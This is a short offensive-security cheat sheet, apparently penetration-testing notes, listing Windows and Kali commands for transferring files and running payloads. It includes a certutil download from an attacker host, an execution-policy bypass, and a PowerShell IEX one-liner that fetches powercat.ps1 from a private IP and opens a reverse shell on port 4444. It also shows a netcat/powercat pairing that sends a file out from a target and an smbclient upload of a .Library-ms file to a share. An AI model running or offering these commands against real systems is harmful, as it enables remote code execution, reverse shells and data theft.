
#### CMD

`certutil -urlcache -split -f "http://ip/file" file` - download remote file from attacker

`powershell -FILE "file.ps1"` - execute file from cmd using powershell.

`powershell -ExecutionPolicy Bypass -File "C:\Scripts\MyScript.ps1"` - attempt to bypass execution policy and execute script.

#### PowerShell

methods used to download powercat.ps1 from attacker:

```
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
```

```
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://ip/powercat.ps1","C:\path\powercat.ps1")
```

`nc -lnvp 443 > notes.txt` - run on attacking machine

`powercat -c 192.168.1.3 -p 443 -i notes.txt` - run on target machine to transfer files

### Kali

`smbclient //192.168.223.195/share -c 'put config.Library-ms'` - transfer file via smbclient from kali to windows share.